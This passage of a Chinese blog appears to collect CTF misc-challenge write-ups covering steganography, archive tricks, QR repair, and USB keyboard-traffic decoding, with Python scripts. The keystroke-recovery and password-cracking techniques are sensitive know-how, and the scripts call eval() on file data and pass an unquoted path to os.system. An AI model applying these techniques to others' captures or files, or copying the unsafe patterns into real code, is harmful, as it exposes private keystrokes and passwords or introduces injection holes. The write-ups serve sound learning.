class="string">R&#x27;\out.pcap&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(fisize)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> io:</span><br><span class="line">        flag = fi.readline()  ;  num = <span class="built_in">len</span>(flag)  ;  str123 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> flag != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">            ind = flag.find(<span class="string">b&#x27;$$START$$&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> ind != -<span class="number">1</span>:</span><br><span class="line">                base_str = flag[ind:-<span class="number">1</span>].replace(<span class="string">b&#x27;$$START$$&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> str123 != base_str:</span><br><span class="line">                    io.write(base_str)</span><br><span class="line">                str123 = <span class="built_in">str</span>(base_str)</span><br><span class="line">                str123 = <span class="built_in">eval</span>(str123)</span><br><span class="line"></span><br><span class="line">            flag = fi.readline()  ;  num += <span class="built_in">len</span>(flag)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r任务进度：&#123;:.2%&#125;&#x27;</span>.<span class="built_in">format</span>(num/fisize),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n提取完毕&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h2><p>发现文件 <code>systemzx</code> 右键竟然可以直接解压缩，解压，得到一个flag.exe，运行一下，发现会自动调用文件已销毁emmm，再来一次，这次只提取 <strong>flag.exe</strong> ，运行，得到一个 <code>机密文件.txt</code>，打开即是flag</p>
<h2 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h2><p>binwalk发现四个压缩包，提取出来，其中两个压缩包带有加密内容，另外两个没有密码，其中txt里面是一串base64，解码为 <code>asdfghjkl1234567890</code> ，猜测可能是压缩包密码，尝试后发现是其中带有图片的加密压缩包密码，不过图片没有发现东西。<br>查看另外两个压缩包内容，flag.doc里面也是 <strong>base64</strong> ，经尝试后，emmm，出题人过来，我要暴揍一顿，24byte的数据硬生生base64转码转到 <strong>8k2</strong> !???，在？当个人？ 解到最后的 <strong>24byte</strong> 内容即为 <strong>mp3</strong> 的解压密码，mp3是莫斯电码，转码得flag</p>
<h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><p>首先用 <code>winrar</code> 打开压缩包会提示文件头错误，<del>我就是个憨憨，电脑上有 <strong>winrar</strong> 不用非用 <strong>好压</strong> ，好压打开和解压缩全部没报错，然后我就没往文件格式上面想，以为多出去的一千多kb是有别的文件，用binwalk跑不出来，就各种查文件头搜索查文件尾搜索</del><br>修复rar压缩包文件头后，拿到png，stegsolve换色道拿到二维码，扫码拿到加密版flag：<br>    ci{v3erf_0tygidv2_fc0}<br>看着像是 <code>凯撒</code> 加 <code>栅栏</code> 加密，题目提示usb，旁边还有一个 <code>key.ftm</code> 没用，binwalk跑一下找到一个压缩包，里面有一个 <code>usb.pcap</code> ，就是这里，我去查usb流量分析的资料，刚好 <code>CTF Wiki</code> 里面有usb的相关资料，是大佬的usb实战分析，看懂之后，白嫖大佬的脚本回来提取关键信息。<br><del>然后。。。然后就是调试、查别的usb相关协议资料、调试、查别的相关协议资料、调。。。</del><br>大佬的脚本年代久远，一些情况已经沧海桑田，修改了一下新的脚本，其中涉及到判断键盘击键信息的相关部分也有不同，针对这道题一一做出调整，细微调整后的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">DataFileName = <span class="string">&quot;usb.dat&quot;</span></span><br><span class="line"></span><br><span class="line">presses = []</span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage : &quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;        python UsbKeyboardHacker.py data.pcap&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Tips : &quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;        To use this python script , you must install the tshark first.&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;        You can use `sudo apt-get install tshark` to install it&quot;</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;        Thank you for using.&quot;</span></span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get argv</span></span><br><span class="line">    pcapFilePath = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get data of pcap</span></span><br><span class="line">    os.system(<span class="string">&quot;tshark -r %s -T fields -e usb.capdata &gt; %s&quot;</span> % (pcapFilePath, DataFileName))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># read data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(DataFileName, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            presses.append(line[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># handle</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> press <span class="keyword">in</span> presses:</span><br><span class="line">        <span class="keyword">if</span> press[<span class="number">6</span>:] == <span class="string">&#x27;0000000000&#x27;</span> <span class="keyword">and</span> press[<span class="number">2</span>:<span class="number">4</span>] == <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> press[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> press[<span class="number">4</span>:<span class="number">6</span>] != <span class="string">&#x27;00&#x27;</span>:</span><br><span class="line">                    result += normalKeys[press[<span class="number">4</span>:<span class="number">6</span>]]</span><br><span class="line">            <span class="keyword">elif</span> press[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;20&#x27;</span> <span class="keyword">or</span> press[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;02&#x27;</span>: <span class="comment"># 20 or 02 all is shift+</span></span><br><span class="line">                <span class="keyword">if</span> press[<span class="number">4</span>:<span class="number">6</span>] != <span class="string">&quot;00&quot;</span>: <span class="comment"># shift key is pressed.</span></span><br><span class="line">                    result += shiftKeys[press[<span class="number">4</span>:<span class="number">6</span>]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;[-] Unknow Key : %s %s&quot;</span> % (press[<span class="number">0</span>:<span class="number">2</span>],press[<span class="number">4</span>:<span class="number">6</span>])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Found : %s&quot;</span> % (result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the temp data</span></span><br><span class="line">    os.system(<span class="string">&quot;rm ./%s&quot;</span> % (DataFileName))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>使用脚本提取出关键信息：<br>    key{xinan}<br>有key，flag疑似被 <code>栅栏</code> 和 <code>凯撒</code> 加密，妥了，<strong>维吉尼亚</strong> 和 <strong>栅栏</strong> 两种加密了应该，掏出之前写过的 <strong>维吉尼亚</strong> 的加解密脚本跑一下：<br>    fa{i3eei_0llgvgn2_sc0}<br>22个字符猜测栅栏加密是两栏，在线解密跑一下得到最终flag（栅栏加密我记得国内外有两种加密算法，回头查一下资料自己造个轮子，感觉以后说不定忘了就会被坑）</p>
<h2 id="SWPU2019-我有一只马里奥"><a href="#SWPU2019-我有一只马里奥" class="headerlink" title="[SWPU2019]我有一只马里奥"></a>[SWPU2019]我有一只马里奥</h2><p>右键发现可以解压缩,拿到一个txt,打开发现提示，是ntfs隐写，然后 <code>ntfsstreamseditor</code> 查看拿到flag</p>
<h2 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h2><p>wireshark没看到什么有价值的东西，题目 <strong>john-in-the-middle</strong> 猜测和中间的流量有关系，看到有一些png，用foremost将其提取出来。其中有一个图片中间是一个小旗子，出于对（旗子）（flag）的敏感，分析这个图片，用stegsolve换色道后发现flag</p>
<h2 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h2><p>在u盘镜像里查看，发现有一个被生成的 <code>autoflag</code> 和其它的大小不一样，将其提取出来分析，winhex查看没有找到疑点，ida打开，查看main函数，发现有一个 <strong>_main</strong> 和 <strong>_main_0</strong> 查看 <strong>_main_0</strong> 发现flag</p>
<h2 id="二维码-一不小心把存放flag的二维码给撕破了"><a href="#二维码-一不小心把存放flag的二维码给撕破了" class="headerlink" title="二维码-一不小心把存放flag的二维码给撕破了"></a>二维码-一不小心把存放flag的二维码给撕破了</h2><p>没啥捷径，ps手工修吧，直接把9块碎图放一起扫不出来，因为这个纸形变略微严重，ps的变形功能可以修回去，不过要是有<strong>大佬学图片识别相关的 够强 用脚本提取关键像素信息，然后自己利用提取的颜色坐标重新生成二维码我觉得也行嘿嘿嘿</strong><br>这里放上我弄好的二维码叭。</p>
<p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages二维码.png" alt="二维码.png"></p>
<h2 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h2><p>代码不规范，问题考虑不到位，ctfer两行泪T_T<br>解压文本中明显是文件的十六进制数据，第一次写的时候高估了电脑的力量，直接把整个数据全部在一次之内处理，然后。。。然后爆破密码爆破了一下午都爆不出来，又去查了一堆压缩包可能出现的花样。<br>之后突然想起来以前第一次写数据转文件脚本的时候有过数据太大导致文件有问题的例子，就赶紧改了一下脚本，然后一下爆出来密码3690。。。解压出图片，打开发现报错，winhex查看发现jpg的文件头被改成png了，改回来，打开图片看见flag</p>
<h2 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h2><p>文件结尾有一段base64，解码发现是rar加密压缩包，仔细看视频发现里面有三张二维码，pr启动，逐帧扫码，所得字符串拼起来即为密码，解压得flag</p>
<h2 id="GXYCTF2019-佛系青年"><a href="#GXYCTF2019-佛系青年" class="headerlink" title="[GXYCTF2019]佛系青年"></a>[GXYCTF2019]佛系青年</h2><p>压缩包伪加密，修改标志位，解压的文件中最后一句是编码，与佛伦禅，解码得flag</p>
<h2 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h2><p>png图片lsb分析发现藏有 <code>DES</code> 加密的密文，需要密钥。<br>密钥应该就在压缩包里了，有密码，尝试后是伪加密，是一个网页的文件，在 <code>index.html</code> 里发现flag字样，尝试后知是base32，解码后的内容即为密钥，解密时发现不是 <code>DES</code> ，是 <code>3DES</code> 加密</p>
<h2 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h2><p>密码.txt里面提示密码的编码格式，用 <code>010 Editor</code> 更换编码为 <code>EBCDIC</code> 时看到密码。然后解压压缩包，一堆小人，网上搜索关键词，<code>侦探 小人 密码</code> ，得知时福尔摩斯小说中出现的密码 <code>跳舞的小人</code> ，对照搜出来的密码表解密即可</p>
<h2 id="GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h2><p>题目解base64后为： <strong>Is this base?</strong> 。flag.txt 中是大量的base64字符串，猜测是base64隐写，掏出自己之前造过的轮子，得到flag</p>
<h2 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h2><p>二维码切块文件尾部跟有序号，写个脚本按序号拼一下，扫码得到提示，压缩包打开可以看到注释，很明显提示给的是密钥的加密过程，反过来解密拿到密码，解压得flag</p>
<h2 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h2><p>这题老实说有点单纯脑洞了。两种细胞很明显就是说代表两种元素，总共256个字节，若转化成图像与二维码不沾边，故应当是二进制的ASCII码，但是没有任何其他提示，让人盲猜如何将其排列为原本的二进制ASCII码。。。吐了，简单试了下异或，不行，果断去搜了wp，不浪费这种时间，wp说是把每八位的二进制倒序一下就是对应字母和数字了</p>
<h2 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h2><p>解压缩是jpg，winhex分析有压缩包，提取出来有密码不是伪加密，爆破得到密码，四位数字。解压出来是一堆无规律字符，猜测是字频。写个脚本，得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]&quot;</span></span><br><span class="line">filename = <span class="built_in">input</span>(<span class="string">&#x27;请输入目标文本:&#x27;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span>(<span class="params">d</span>):</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(backitems))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sort_by_value(result))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(sort_by_value(result)))</span><br></pre></td></tr></table></figure>
<h2 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h2><p>winhex分析出有个压缩包，提取出来，解压缩发现是个安卓应用包，改后缀zip为apk，用安卓反编译软件反编译，搜索flag字符串找到flag</p>
<h2 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h2><p>题目叫network，文件内容是一堆63、127、191、255，查资料发现可能有关联的是一个被叫做 <code>TTL</code> 的东西，这个 <code>TTL</code> 简单来说就是计数用的。简单比方一下，当你向目标主机发送报文时，ttl的初始值就是所允许经过的最大节点数，经过一个节点转发，ttl 就减一，减到零还没到目标主机就会自动销毁报文。这里四个数字差距过大，差值也不像有什么关联性。这里由 LSB 隐写联想到，lsb是修改色素二进制值最低位来隐藏01字符串，把63、127、191、255 可能是将01字符串藏在了最高位。因为lsb最低位隐写是因为修改最低位时只看图像不容易发觉问题，同理ttl每次减一，修改最高位影响最小。将四个数转二进制发现刚好最高两位分别是00、01、10、11，其余位皆为1，写脚本将其提取并转ASCII码，发现是压缩包，尝试后发现是伪加密，拿到文本，base64套娃。。。异常处理脚本写一个查看最终结果，得到flag</p>
<h2 id="SWPU2019-你有没有好好看网课"><a href="#SWPU2019-你有没有好好看网课" class="headerlink" title="[SWPU2019]你有没有好好看网课"></a>[SWPU2019]你有没有好好看网课</h2><p>两个加密包，一个可以爆破出密码，一个应该是正常加密了。爆破的这个包里的word文字明显不连贯，应该是和解题有关，应该是指视频的 <code>5：20</code> 和 <code>7：11</code> ，找啊找，在白色吊灯里有两节白色小字符emmm 提取出来：<br>    ….. ../… ./… ./… ../<br>    dXBfdXBfdXA=<br>    经尝试第一节是敲击码，第二节base64<br>合在一起是另一个压缩包密码，解压出一个jpg，在文件结尾发现flag</p>
<h2 id="粽子的来历"><a href="#粽子的来历" class="headerlink" title="粽子的来历"></a>粽子的来历</h2><p>四个word文档，在这里容我先说一句，金山文档WPS就是个弟弟，文件格式不对竟然不报错强行打开解码，我差点以为是我哈皮了，看着一堆乱码总感觉是文件有问题，office365打开当场报错格式有问题。winhex查看，发现四个文件开头都加了一句Icomefromxxxxx，猜测将其改回ff即可，另，题目描述说藏在dbapp了，第三个文件正好说来自dbapp，应该就藏在这个文件里。<br>打开是屈原的一首诗，题目描述也说曹小明把地点藏在了诗中，又说flag是正确数值连在一起后的md5。。。脑洞太大着实想不到点，无奈搜了wp后。。。。。。。。。<br>狗贼受死！！！行间距不一样，1.5倍行间距设为数值1，1倍设为0，连在一起的01字符串md5即为flag？？？在？你咋不设该行有‘之’字的话对应1，没有对应0呢？？？玩不起？？？是我太菜不配打ctf了，告辞</p>
<h2 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h2><p>下载下来的压缩包打开是空的，winhex在尾部看到flag</p>
